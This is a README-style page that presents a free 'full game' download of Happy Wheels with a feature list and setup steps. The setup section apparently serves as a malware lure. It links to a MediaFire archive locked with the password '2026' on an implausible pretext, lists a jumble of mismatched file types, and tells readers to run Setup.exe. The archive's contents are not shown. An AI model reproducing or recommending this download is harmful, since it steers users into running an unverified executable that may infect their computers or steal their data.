## 🕹️ About

Happy Wheels is a side-scrolling, physics-based sandbox game created by Jim Bonacci and published by Fancy Force. Players choose from multiple characters and vehicles, then navigate dangerous obstacle courses filled with traps, hazards, and unpredictable physics. Its dark cartoon humor, exaggerated injuries, and huge library of community-created levels make every attempt different. The game also includes a level editor for building and sharing custom courses. This package is prepared for straightforward installation of the full game.

Happy Wheels is for players who enjoy short, chaotic physics challenges, dark cartoon humor, and endless user-created content.

## ✨ Features

- 💥 **Deadly Obstacles** — Avoid spikes, mines, wrecking balls, harpoons, and other dangerous hazards.
- 🛠️ **Level Editor** — Create, test, and share custom courses with the community.
- 🌐 **Community Levels** — Play a large variety of user-created stages with different challenges and goals.
- 🧍 **Multiple Characters** — Choose characters with different vehicles and distinct abilities.
- 🏎️ **Physics-Based Gameplay** — Control ragdoll characters and vehicles through unpredictable obstacle courses.

## 📦 Download & Setup

| Platform | Status |

### Step 1: Download

Download the package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- installer.dat <- Installer data
|-- settings.bin <- Configuration
|-- patch_1.bnk <- Audio banks
|-- update_1.ini <- Update config
|-- scripts.lic <- Game scripts
|-- bootstrap.wem <- Bootstrap audio
|-- dlc.md5 <- DLC checksums
|-- driver.pak <- Driver archive
|-- localization.ini <- Language files
|-- res.pak <- Resources archive
|-- launcher.dll <- Launcher library
|-- audio.res <- Audio resources
|-- animations.dll <- Animation system
|-- assets.wem <- Asset audio
|-- license.wem <- Audio assets
|-- driver.umap <- Driver data
|-- physics.sys <- Physics engine
|-- lang.sys <- Language system
|-- Password 2026.txt <- Password reminder (empty)
|-- license.bank <- License data
|-- update_1.res <- Update resources
|-- global.cfg <- Global settings
|-- uninstall.key <- Uninstall key
|-- api.pak <- API modules
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
